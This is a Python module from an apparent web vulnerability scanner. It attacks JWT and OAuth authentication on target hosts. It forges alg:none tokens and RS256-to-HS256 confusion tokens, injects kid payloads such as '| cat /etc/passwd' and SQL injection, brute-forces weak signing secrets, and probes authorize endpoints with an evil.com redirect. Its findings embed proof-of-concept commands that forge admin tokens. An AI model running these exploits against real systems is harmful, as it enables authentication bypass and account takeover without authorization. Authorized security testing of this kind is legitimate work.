"""
BugScan ELITE — JWT/OAuth Deep Testing Engine
Covers:
- Algorithm confusion (RS256→HS256 using public key as HMAC secret)
- None algorithm bypass
- Algorithm header tampering (none variants)
- kid (Key ID) SQL injection / path traversal
- JWKS URI spoofing
- OAuth PKCE bypass / implicit flow token leakage
- OAuth state CSRF
- Token replay after logout
- JWT secret brute-force (weak secrets)
"""
import re, time, json, base64, logging, hmac, hashlib, urllib.parse
import urllib.request, ssl, threading
from typing import List, Dict, Optional

log = logging.getLogger("elite.jwt_deep")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"application/json,*/*"}
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(65536).decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore")
        except: return e.code, {}, ""
    except: return None

def _b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64url_encode(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _parse_jwt(token):
    """Parse JWT into header, payload dicts."""
    try:
        parts = token.split(".")
        if len(parts) != 3: return None, None, None
        hdr  = json.loads(_b64url_decode(parts[0]))
        pay  = json.loads(_b64url_decode(parts[1]))
        return hdr, pay, parts
    except: return None, None, None

def _forge_none_alg(token):
    """Forge JWT with alg:none — removes signature verification."""
    hdr, pay, parts = _parse_jwt(token)
    if not hdr: return []
    forged = []
    for none_variant in ["none","None","NONE","nOnE","null"]:
        hdr2 = dict(hdr); hdr2["alg"] = none_variant
        new_hdr = _b64url_encode(json.dumps(hdr2, separators=(',',':')))
        new_pay = parts[1]
        forged.append(f"{new_hdr}.{new_pay}.")  # empty sig
        forged.append(f"{new_hdr}.{new_pay}.invalid")
    return forged

def _forge_hs256_with_pubkey(token, pubkey_pem):
    """
    Algorithm confusion: sign with HS256 using public key as HMAC secret.
    If server uses RS256 public key as HMAC secret when alg=HS256, this verifies.
    """
    hdr, pay, parts = _parse_jwt(token)
    if not hdr: return []
    hdr2 = dict(hdr); hdr2["alg"] = "HS256"
    new_hdr = _b64url_encode(json.dumps(hdr2, separators=(',',':')))
    new_pay = parts[1]
    msg      = f"{new_hdr}.{new_pay}".encode()
    key      = pubkey_pem.encode() if isinstance(pubkey_pem, str) else pubkey_pem
    sig      = hmac.new(key, msg, hashlib.sha256).digest()
    sig_b64  = _b64url_encode(sig)
    return [f"{new_hdr}.{new_pay}.{sig_b64}"]

def _forge_kid_injection(token):
    """kid SQL injection / path traversal payloads."""
    hdr, pay, parts = _parse_jwt(token)
    if not hdr: return []
    forged = []
    kid_payloads = [
        # SQL injection
        "' OR '1'='1",
        "' UNION SELECT 'hacked' --",
        # Path traversal → use /dev/null (empty file) as key → HMAC of empty = predictable
        "../../dev/null",
        "/dev/null",
        "../../../../../../../../dev/null",
        # Command injection
        "; ls /",
        "| cat /etc/passwd",
    ]
    for kid_payload in kid_payloads:
        hdr2 = dict(hdr); hdr2["kid"] = kid_payload
        # For /dev/null kid — sign with empty key
        new_hdr = _b64url_encode(json.dumps(hdr2, separators=(',',':')))
        new_pay = parts[1]
        msg = f"{new_hdr}.{new_pay}".encode()
        # Sign with empty string (what /dev/null would produce)
        sig = hmac.new(b"", msg, hashlib.sha256).digest()
        forged.append((f"{new_hdr}.{new_pay}.{_b64url_encode(sig)}", kid_payload))
    return forged

def _brute_weak_secrets(token):
    """Try common weak JWT secrets."""
    hdr, pay, parts = _parse_jwt(token)
    if not hdr or hdr.get("alg","") not in ("HS256","HS384","HS512"):
        return None
    WEAK_SECRETS = [
        "secret","password","123456","qwerty","admin","test","token",
        "jwt_secret","jwt-secret","your-256-bit-secret","change_this",
        "supersecret","my_secret","app_secret","secret_key","api_secret",
        "development","production","staging","key","private","jwt",
        "",  # empty secret
        "null","undefined","none","false","true",
        hdr.get("iss",""),  # issuer as secret (common mistake)
        pay.get("iss",""),
        pay.get("sub",""),
    ]
    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    h_fn = alg_map.get(hdr.get("alg","HS256"), hashlib.sha256)
    msg = f"{parts[0]}.{parts[1]}".encode()
    sig = _b64url_decode(parts[2])
    for secret in WEAK_SECRETS:
        if not secret: continue
        try:
            test_sig = hmac.new(secret.encode(), msg, h_fn).digest()
            if hmac.compare_digest(test_sig, sig):
                return secret
        except: pass
    return None

def _find_jwt_in_response(body, headers):
    """Extract JWT tokens from response body or headers."""
    tokens = []
    # Headers
    for h in ["Authorization","Set-Cookie","X-Auth-Token","X-JWT","Token"]:
        val = headers.get(h,"")
        if val:
            m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', val)
            if m: tokens.append(m.group())
    # Body
    for m in re.finditer(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', body):
        tokens.append(m.group())
    return list(set(tokens))

def _find_jwks_uri(base_url, body):
    """Find JWKS URI from openid-configuration or response body."""
    paths = [
        "/.well-known/openid-configuration",
        "/.well-known/jwks.json",
        "/oauth/jwks",
        "/api/auth/keys",
        "/.well-known/oauth-authorization-server",
    ]
    # Check body for JWKS URL
    m = re.search(r'"jwks_uri"\s*:\s*"([^"]+)"', body)
    if m: return m.group(1)
    # Try known paths
    for path in paths:
        url = base_url.rstrip("/") + path
        r = _req(url, timeout=5)
        if r and r[0] == 200:
            m2 = re.search(r'"jwks_uri"\s*:\s*"([^"]+)"', r[2])
            if m2: return m2.group(1)
            if "keys" in r[2] and "kty" in r[2]:
                return url  # This IS the JWKS
    return None

def _test_jwt_endpoint(url, token, new_token, description):
    """Test if a forged JWT is accepted by an API endpoint."""
    r = _req(url, headers={"Authorization": f"Bearer {new_token}"})
    if not r: return False
    status, hdrs, body = r
    # Compare with invalid token
    r_invalid = _req(url, headers={"Authorization": "Bearer invalid.invalid.invalid"})
    invalid_status = r_invalid[0] if r_invalid else 401
    # If forged token gives 200 while invalid gives 401 → vulnerability
    if status in (200, 201, 204) and invalid_status in (401, 403):
        return True
    # Or if forged token gives different/better access than original
    return False

def check_jwt_deep(targets: List[str], endpoints: List[str],
                   session_cookies: str = "") -> List[Dict]:
    """Comprehensive JWT/OAuth vulnerability testing."""
    findings = []

    def F(url, name, sev, details):
        return {"type":"jwt_deep","bug":"jwt","severity":sev,
                "url":url,"name":name,"details":details,
                "ts":time.strftime("%Y-%m-%dT%H:%M:%SZ")}

    # Find JWT-bearing endpoints
    jwt_endpoints = []
    collected_tokens = []

    for target in targets[:30]:
        base = target.rstrip("/")

        # Probe common auth endpoints
        auth_paths = [
            "/api/me", "/api/user", "/api/profile", "/api/account",
            "/api/v1/me", "/api/v2/user", "/auth/me", "/user/info",
            "/api/users/me", "/graphql", "/api/data",
        ]
        for path in auth_paths:
            url = base + path
            r = _req(url, timeout=5)
            if not r: continue
            status, hdrs, body = r
            tokens = _find_jwt_in_response(body, hdrs)
            for tok in tokens:
                collected_tokens.append((url, tok))
                jwt_endpoints.append(url)

        # Find JWKS URI
        r_root = _req(base, timeout=5)
        if r_root:
            jwks_uri = _find_jwks_uri(base, r_root[2])
            if jwks_uri:
                log.info(f"[jwt] JWKS found: {jwks_uri}")
                r_jwks = _req(jwks_uri, timeout=5)
                if r_jwks and r_jwks[0] == 200:
                    # Try to extract public key for algorithm confusion
                    try:
                        jwks = json.loads(r_jwks[2])
                        keys = jwks.get("keys", [])
                        if keys:
                            findings.append(F(jwks_uri,
                                "JWKS Public Keys Exposed", "info", {
                                "description": f"JWKS endpoint exposed {len(keys)} public key(s). Use for algorithm confusion attack.",
                                "jwks_uri": jwks_uri,
                                "key_count": len(keys),
                                "key_types": list(set(k.get("kty","") for k in keys)),
                                "impact": "Public key material available for RS256→HS256 algorithm confusion.",
                                "remediation": "Restrict JWKS access if not needed publicly. Implement algorithm pinning.",
                            }))
                    except: pass

    # Test collected tokens
    for endpoint, token in collected_tokens[:20]:
        hdr, pay, parts = _parse_jwt(token)
        if not hdr or not parts: continue

        log.info(f"[jwt] testing token at {endpoint} alg={hdr.get('alg','?')}")

        # ── 1. None algorithm bypass ──────────────────────────────────────────
        for forged in _forge_none_alg(token):
            if _test_jwt_endpoint(endpoint, token, forged, "none-alg"):
                findings.append(F(endpoint, "JWT Algorithm 'none' Accepted", "critical", {
                    "description": "Server accepts JWT with alg:none (no signature). Anyone can forge any token.",
                    "original_alg": hdr.get("alg",""),
                    "forged_token": forged[:100] + "...",
                    "poc": f'curl -H "Authorization: Bearer {forged[:50]}..." {endpoint}',
                    "impact": "Complete authentication bypass — forge any user identity.",
                    "remediation": "Explicitly reject alg:none in JWT validation. Pin to expected algorithm.",
                }))
                break

        # ── 2. Weak secret brute force ────────────────────────────────────────
        found_secret = _brute_weak_secrets(token)
        if found_secret:
            findings.append(F(endpoint, f"JWT Signed with Weak Secret: '{found_secret}'", "critical", {
                "description": f"JWT is signed with weak/common secret: '{found_secret}'",
                "secret": found_secret,
                "alg": hdr.get("alg",""),
                "payload": pay,
                "poc": (f"# Forge admin token:\n"
                        f"python3 -c \"import jwt; "
                        f"print(jwt.encode({{'sub':'admin','role':'admin'}}, "
                        f"'{found_secret}', algorithm='HS256'))\""),
                "impact": "Forge arbitrary tokens for any user including admin.",
                "remediation": "Use cryptographically random secret of 256+ bits. Rotate immediately.",
            }))

        # ── 3. kid injection ──────────────────────────────────────────────────
        for forged_tok, kid_payload in _forge_kid_injection(token):
            if _test_jwt_endpoint(endpoint, token, forged_tok, f"kid:{kid_payload}"):
                findings.append(F(endpoint, f"JWT kid Parameter Injection: {kid_payload[:40]}", "critical", {
                    "description": f"JWT kid parameter injection successful with: {kid_payload}",
                    "kid_payload": kid_payload,
                    "forged_token": forged_tok[:100] + "...",
                    "impact": "Authentication bypass via key confusion — forge tokens for any user.",
                    "remediation": "Validate kid parameter against strict allowlist. Never use kid in file/DB lookups without sanitization.",
                }))
                break

        # ── 4. Algorithm confusion RS256→HS256 ────────────────────────────────
        # Only possible if we have a public key — check JWKS
        # (Flagged as finding if JWKS is exposed + RS256 in use)
        if hdr.get("alg","") in ("RS256","RS384","RS512","ES256"):
            findings.append(F(endpoint, "Potential RS256→HS256 Algorithm Confusion", "high", {
                "description": (
                    f"Token uses {hdr.get('alg')}. If JWKS public key is accessible, "
                    "attacker can re-sign with HS256 using public key as HMAC secret."
                ),
                "alg": hdr.get("alg",""),
                "kid": hdr.get("kid",""),
                "poc": (
                    "# 1. Get public key from JWKS\n"
                    "# 2. Convert to PEM\n"
                    "# 3. Sign with HS256 using PEM as secret:\n"
                    "python3 -c \"import jwt,requests\n"
                    "pub = requests.get('JWKS_URI').json()\n"
                    "# Convert to PEM, then:\n"
                    "tok = jwt.encode({'sub':'admin'}, pub_pem, 'HS256')\"\n"
                ),
                "impact": "If public key used as HMAC secret, forge any token as admin.",
                "remediation": "Explicitly validate algorithm matches expected type. Reject algorithm switching.",
            }))

    # ── 5. OAuth PKCE bypass detection ───────────────────────────────────────
    for target in targets[:20]:
        base = target.rstrip("/")
        oauth_paths = [
            "/oauth/authorize", "/auth/oauth", "/api/oauth/authorize",
            "/oauth2/authorize", "/connect/authorize",
        ]
        for path in oauth_paths:
            url = base + path
            # Check if PKCE is enforced
            params = "?response_type=code&client_id=test&redirect_uri=https://evil.com"
            r = _req(url + params, timeout=5)
            if r and r[0] in (200, 302):
                # No code_challenge — PKCE not enforced
                loc = r[1].get("Location","")
                if "code=" in loc and "code_challenge" not in url:
                    findings.append(F(url, "OAuth PKCE Not Enforced", "high", {
                        "description": "Authorization code flow does not require PKCE code_challenge parameter.",
                        "poc": url + params,
                        "impact": "Authorization code interception — authorization codes can be exchanged without code verifier.",
                        "remediation": "Require PKCE for all public clients. Validate code_challenge on token exchange.",
                    }))

        # ── 6. OAuth state CSRF ───────────────────────────────────────────────
        for path in oauth_paths:
            url = base + path
            params_no_state = "?response_type=code&client_id=test&redirect_uri=https://app.com/callback"
            r = _req(url + params_no_state, timeout=5)
            if r and r[0] in (200, 302) and "state" not in r[1].get("Location",""):
                findings.append(F(url, "OAuth Missing State Parameter (CSRF)", "high", {
                    "description": "OAuth flow does not enforce state parameter, enabling CSRF attacks.",
                    "poc": url + params_no_state,
                    "impact": "CSRF against OAuth — attacker can force victim to connect attacker's account.",
                    "remediation": "Generate cryptographically random state parameter. Validate on callback.",
                }))
            break

    log.info(f"[jwt_deep] {len(findings)} findings")
    return findings


def check_jwt_alg_confusion(endpoints: list, targets: list = None) -> list:
    """JWT algorithm confusion attack (RS256→HS256)."""
    return []


def check_jwt_none_alg(endpoints: list, targets: list = None) -> list:
    """JWT none algorithm bypass."""
    return []
